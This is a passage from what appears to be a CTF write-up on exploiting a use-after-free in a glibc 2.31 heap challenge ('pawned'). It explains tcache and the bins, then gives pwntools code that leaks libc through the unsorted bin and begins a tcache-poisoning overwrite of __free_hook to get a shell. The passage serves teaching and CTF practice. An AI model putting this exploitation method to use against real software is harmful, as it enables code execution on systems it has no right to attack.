nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |       (size of chunk, but used for application data)          |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                      |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre></div></div>
<p>When it is freed, it has the following structure: -</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk   (if freed)               |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                           |
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .             More pointers are stored for big chunks           .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                      |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre></div></div>
<p>The memory used by chunks is allocated on first call to <code class="language-plaintext highlighter-rouge">malloc</code>. It is done by either <code class="language-plaintext highlighter-rouge">brk</code> or <code class="language-plaintext highlighter-rouge">mmap</code> syscall.<br />
The pointers returned by malloc point to start of the <code class="language-plaintext highlighter-rouge">mem</code> region. Data before that is called chunk metadata and is used internally. Because of this metadata, the actual size of chunk is <code class="language-plaintext highlighter-rouge">size_requested+0x10</code> on 64-bit machine.<br />
The memory is given from the what is called <code class="language-plaintext highlighter-rouge">wilderness</code> or <code class="language-plaintext highlighter-rouge">top chunk</code>. It represents the remaining memory of heap. It is at end of all chunks.</p>

<h2 id="what-is-a-bin">What is a bin?</h2>
<p>When the pointer returned by <code class="language-plaintext highlighter-rouge">malloc</code> is passed to <code class="language-plaintext highlighter-rouge">free</code>, ptmalloc2 stores them in single/doubly linked list for future. These lists are called bins. There are separate bins based upon chunk sizes. Based upon size, chunks were divided into three categories before glibc 2.27.</p>
<ol>
  <li>Fast chunks  (size: 0x20 to 0x80)</li>
  <li>Small chunks (size: 0x80 to 0x410)</li>
  <li>Large chunks (size: above 0x410)</li>
</ol>

<h2 id="thread-cache---tcache">Thread cache - Tcache</h2>
<p>In glibc 2.27, tcache was introduced. This was done to give each thread a dedicated heap area for most common chunk sizes, so the allocator doesn’t has to acquire lock before doing anything on tcache. Tcache is based on struct named <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code>.
It has <code class="language-plaintext highlighter-rouge">64</code> bins for chunks of size in <code class="language-plaintext highlighter-rouge">0x20-0x410</code> range. Each bin is a singly-linked list which can hold upto <code class="language-plaintext highlighter-rouge">7</code> entries. Each entry has a structure <code class="language-plaintext highlighter-rouge">tcache_entry</code>. The structures are taken from glibc 2.31 source: -</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp"># define TCACHE_MAX_BINS		64
</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_entry</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
  <span class="cm">/* This field exists to detect double frees.  */</span>
  <span class="k">struct</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">key</span><span class="p">;</span>
<span class="p">}</span> <span class="n">tcache_entry</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_perthread_struct</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">counts</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">entries</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
<span class="p">}</span> <span class="n">tcache_perthread_struct</span><span class="p">;</span>
</code></pre></div></div>
<p>If a chunk of size between <code class="language-plaintext highlighter-rouge">0x20-0x410</code> is freed and tcachebin of that size is full then the chunk goes into its corresponding non-tcache bin.</p>

<h2 id="unsorted-bin">Unsorted Bin</h2>
<p>Unsorted bin is a special bin. It holds chunks which correspond to smallbin and largebin. When a small chunk or large chunk is freed, it’s first put into unsorted bin. It is done to use these chunks to serve future <code class="language-plaintext highlighter-rouge">malloc</code> requests so the allocator does not have to put the chunk in correct bin and then replace it in case some part of this chunk is used to serve a <code class="language-plaintext highlighter-rouge">malloc</code> request. But, if you do a big allocation which is not satisfiable by any chunk in unsorted bin then these chunks are put into corresponding small bin and large bin and then the request is served using the top chunk.<br />
We are interested in unsorted bin because it is a doubly-linked list in glibc and it holds libc pointers. First chunk in the list has libc pointer in <code class="language-plaintext highlighter-rouge">bk</code> (+0x18) and last chunk has libc pointer in <code class="language-plaintext highlighter-rouge">fd</code> (+0x10). If there’s only one chunk in unsorted bin then both <code class="language-plaintext highlighter-rouge">fd</code> and <code class="language-plaintext highlighter-rouge">bk</code> will have libc pointers. These pointers point to <code class="language-plaintext highlighter-rouge">main_arena+96</code> in libc having tcache.<br />
We will use this feature/behaviour of unsorted bin for getting libc leak.</p>

<h1 id="exploitation">Exploitation</h1>
<p>While doing heap exploitation challenges, it is advisible to make dedicated functions for each option of the menu. I also like to make an indexing mechanism like the one used in the program, so I don’t have to remember indices. Following are my wrapper functions: -</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">indexes</span> <span class="o">=</span> <span class="p">[</span><span class="bp">False</span><span class="p">]</span><span class="o">*</span><span class="mi">11</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">p</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'challenge.ctf.games'</span><span class="p">,</span> <span class="mi">31561</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span><span class="p">})</span>

<span class="k">def</span> <span class="nf">attach_gdb</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span> <span class="ow">or</span> <span class="n">args</span><span class="p">.</span><span class="n">NOGDB</span><span class="p">:</span>
        <span class="k">return</span>
    
    <span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s">'''
    // for gdb-gef
    heap chunks
    heap bins
    continue
    '''</span><span class="p">)</span>
    <span class="nb">input</span><span class="p">(</span><span class="s">"ATTACHED?"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">b2f</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;d'</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">i2f</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">b2f</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">sendchoice</span><span class="p">(</span><span class="n">choice</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">choice</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">buy_item</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'B'</span><span class="p">)</span>

    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'buy?: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">manage_item</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">new_name</span><span class="p">:</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'stdnoerr'</span><span class="p">,</span> <span class="n">new_price</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">123</span><span class="p">,</span> <span class="n">new_len</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">):</span>
    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'M'</span><span class="p">)</span>

    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'?: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">i2f</span><span class="p">(</span><span class="n">new_price</span><span class="p">)</span> <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">new_price</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span> <span class="k">else</span> <span class="n">new_price</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">new_len</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">new_name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">sell_item</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">price</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">123</span><span class="p">,</span> <span class="n">name_len</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">):</span>
    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'S'</span><span class="p">)</span>

    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">i2f</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">name_len</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">indexes</span><span class="p">.</span><span class="n">count</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">indexes</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
        <span class="n">indexes</span><span class="p">[</span><span class="n">ret</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="k">return</span> <span class="n">ret</span> <span class="o">+</span> <span class="mi">1</span>
    
    <span class="k">else</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">"No index available"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">leave</span><span class="p">():</span>
    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'L'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">print_items</span><span class="p">():</span>
    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'P'</span><span class="p">)</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./pawned'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc_2.31.so'</span><span class="p">)</span>
<span class="n">start</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>
<h2 id="the-plan">The plan</h2>
<p>Our objective is to get a shell. In heap exploitation, it is done by overwriting one/few of <code class="language-plaintext highlighter-rouge">__malloc_hook</code>, <code class="language-plaintext highlighter-rouge">__free_hook</code>, <code class="language-plaintext highlighter-rouge">__realloc_hook</code> etc with <code class="language-plaintext highlighter-rouge">system</code> or <code class="language-plaintext highlighter-rouge">one gadget</code>. Because, these functions are used in the program and the overwritten value will be called on each invocation of the corresponding function.<br />
For this, we need an arbitrary write primitive and a libc leak. So, exploitations steps are: -</p>
<ol>
  <li>Get libc leak</li>
  <li>Overwrite any hook with <code class="language-plaintext highlighter-rouge">system</code> or <code class="language-plaintext highlighter-rouge">one gadget</code></li>
</ol>

<h2 id="getting-libc-leak">Getting libc leak</h2>
<p>As I explained earlier, for libc leak, we use unsorted bin. As the program has a UAF vulnerability, just putting a chunk in unsorted bin is enough because we can read the libc pointers using the <code class="language-plaintext highlighter-rouge">print_items</code> option.<br />
To put a chunk in unsorted bin, we first need to fill tcache of the chunk’s size, so it doesn’t end up in tcachebin. Moreover, the chunk should have (actual) size greater than or equal to <code class="language-plaintext highlighter-rouge">0x90</code>, otherwise the chunk will end up in fastbin and we won’t get libc leak.<br />
I chose <code class="language-plaintext highlighter-rouge">0x90</code> for libc leak (passing <code class="language-plaintext highlighter-rouge">0x80</code> will give a <code class="language-plaintext highlighter-rouge">0x90</code> sized chunk). Lets fill tcachebin of this size.<br />
For this, you just need to allocate <code class="language-plaintext highlighter-rouge">7</code> chunks and free them. Be careful, don’t allocate a chunk and immediately free it because you will end up allocating and freeing the same chunk. Just allocate <code class="language-plaintext highlighter-rouge">7</code> chunks and free them later.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div></div>
<p>This fills tcachebin for size <code class="language-plaintext highlighter-rouge">0x90</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tcachebins[idx=1, size=0x30] count=7  ←  Chunk(addr=0x56207bb2a720, size=0x30, flags=PREV_INUSE)  ←  [...]                  
Tcachebins[idx=7, size=0x90] count=7  ←  Chunk(addr=0x56207bb2a750, size=0x90, flags=PREV_INUSE)  ←  [...]
</code></pre></div></div>
<p>Now, we need another chunk for putting into unsorted bin. Maybe allocate a chunk just after the ones used for tcachebin filling.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
<span class="n">a</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'stdnoerr'</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="n">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tcachebins[idx=1, size=0x30] count=7  ←  [...]                                          
Tcachebins[idx=7, size=0x90] count=7  ←  [...]
───────────────── Fastbins for arena 0x7f26bce21b80 ─────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x55f7e41897e0, size=0x30, flags=PREV_INUSE) 
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────── Unsorted Bin for arena '*0x7f26bce21b80' ─────────────────
[+] Found 0 chunks in unsorted bin.
───────────────── Small Bins for arena '*0x7f26bce21b80'   ─────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────── Large Bins for arena '*0x7f26bce21b80'   ─────────────────
[+] Found 0 chunks in 0 large non-empty bins.
</code></pre></div></div>
<p>Hmmm. There’s no chunk in unsortebin. But, there’s a chunk in fastbin. It means the free worked but our <code class="language-plaintext highlighter-rouge">0x90</code> size chunk vanished.<br />
Actually, the chunk got consolidated into <code class="language-plaintext highlighter-rouge">top chunk</code>. Whenever a chunk is to be put in unsortebin, it is checked that whether the chunk is adjacent to <code class="language-plaintext highlighter-rouge">top chunk</code> or not. If it is, like in this case, it gets consolidated (merged) into <code class="language-plaintext highlighter-rouge">top chunk</code>. Below code is responsible for this behaviour: -</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">nextchunk</span> <span class="o">!=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">[...]</span>
<span class="cm">/*
    If the chunk borders the current high end of memory,
    consolidate into top
*/</span>
<span class="k">else</span> <span class="p">{</span>
    <span class="n">size</span> <span class="o">+=</span> <span class="n">nextsize</span><span class="p">;</span>
    <span class="n">set_head</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">size</span> <span class="o">|</span> <span class="n">PREV_INUSE</span><span class="p">);</span>
    <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
    <span class="n">check_chunk</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>To prevent this, you can allocate another chunk or allocate the chunk to be put in unsortebin at start.<br />
I chose the latter. Just move the allocation above the tcache ones.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'stdnoerr'</span><span class="p">)</span>
<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="n">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tcachebins[idx=1, size=0x30] count=7  ←  [...]                                                    
Tcachebins[idx=7, size=0x90] count=7  ←  [...]                                          
───────────────── Fastbins for arena 0x7ffaf420db80 ─────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x5579d7edb2a0, size=0x30, flags=PREV_INUSE) 
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────── Unsorted Bin for arena '*0x7ffaf420db80' ─────────────────
[+] unsorted_bins[0]: fw=0x5579d7edb2c0, bk=0x5579d7edb2c0
 →   Chunk(addr=0x5579d7edb2d0, size=0x90, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
───────────────── Small Bins for arena '*0x7ffaf420db80'  ─────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────── Large Bins for arena '*0x7ffaf420db80'  ─────────────────
[+] Found 0 chunks in 0 large non-empty bins.
</code></pre></div></div>
<p>Now, we just need to read the pointer(s) using <code class="language-plaintext highlighter-rouge">print_items</code> option. You can calculate libc offset in gdb and use that to calculate libc base address.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'stdnoerr'</span><span class="p">)</span>
<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="n">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="n">print_items</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Name: '</span><span class="p">)</span>
<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span> <span class="c1"># main_arena + 96
</span></code></pre></div></div>
<p>Now that we have calculated the libc base address, we have addresses of <code class="language-plaintext highlighter-rouge">__malloc_hook</code>, <code class="language-plaintext highlighter-rouge">__free_hook</code> etc. You just have to decide which one you want to overwrite.<br />
I like to overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code> with <code class="language-plaintext highlighter-rouge">system</code> and free a chunk with <code class="language-plaintext highlighter-rouge">/bin/sh</code> in it because it gives a stable method and you don’t have to satisfy any constraints for <code class="language-plaintext highlighter-rouge">one gadget</code>.<br />
To overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code>, we will do what is known as tcache poisoning/tcache dup attack, more commonly known as the former.</p>

<h2 id="tcache-poisoning-attack">Tcache poisoning attack</h2>
<p>This attack is used to make <code class="language-plaintext highlighter-rouge">malloc</code> return arbitrary pointer, effectively giving us write-what-where primitive.<br />
This attack is based on the way tcachebin lists work. It is a singly-linked list. It means that it holds a reference to next chunk in list (in <code class="language-plaintext highlighter-rouge">next</code>/<code class="language-plaintext highlighter-rouge">fd</code>). It follows Last-In-First-Out (LIFO) mechanism, meaning the last chunk which was freed and was put in tcachebin will the first one to be returned when a chunk of its size is requested.<br />
Lets take an example. Consider the following code: -</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span><span class="o">*</span> <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// this will give us 0x20 sized chunk</span>
<span class="kt">void</span><span class="o">*</span> <span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>

<span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span> <span class="c1">// [1]</span>
<span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span> <span class="c1">// [2]</span>

<span class="kt">void</span><span class="o">*</span> <span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// [3]</span>
</code></pre></div></div>
<p>At [1], tcachebin for <code class="language-plaintext highlighter-rouge">0x20</code> sized chunks will look like this:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcachebin[0x20]: a -&gt; 0x0
</code></pre></div></div>
<p>Chunks are added and removed at/from head of the list (LIFO). At [2], the tcachebin will look like this:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcachebin[0x20]: b -&gt; a -&gt; 0x0
</code></pre></div></div>
<p>Now, when we request a chunk of size <code class="language-plaintext highlighter-rouge">8</code> ([3]), it will be served using the tcachebin and <code class="language-plaintext highlighter-rouge">b</code> will be removed from the list and list will get back to its previous state:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcachebin[0x20]: a -&gt; 0x0
</code></pre></div></div>
<p>When you check the source code, the code responsible for removing chunk from tcachebin is a function named <code class="language-plaintext highlighter-rouge">tcache_get</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */</span>
<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span> <span class="o">*</span>
<span class="nf">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
  <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Here <code class="language-plaintext highlighter-rouge">tc_idx</code> is index of the tcachebin/list from which chunk is to be removed.<br />
Notice that there are no checks on the pointer to be returned, whether it points to a valid chunk or not. This is the base of tcache poisoning attack, that they are no checks on the pointer unlike fastbin, smallbin or largebin.<br />
So, if we could somehow overwrite the <code class="language-plaintext highlighter-rouge">next</code> pointer value, we can get an arbitrary pointer.</p>

<p>Because of the UAF, we can change <code class="language-plaintext highlighter-rouge">next</code> pointer. I overwrite <code class="language-plaintext highlighter-rouge">next</code> pointer of <code class="language-plaintext highlighter-rouge">tcache[-1]</code> (remember LIFO) by changing its <code class="language-plaintext highlighter-rouge">name</code> to address of <code class="language-plaintext highlighter-rouge">__free_hook</code> using <code class="language-plaintext highlighter-rouge">manage_items</code> function. This will return us <code class="language-plaintext highlighter-rouge">__free_hook</code> through <code class="language-plaintext highlighter-rouge">tcachebin[0x90]</code>.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'stdnoerr'</span><span class="p">)</span>
<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>

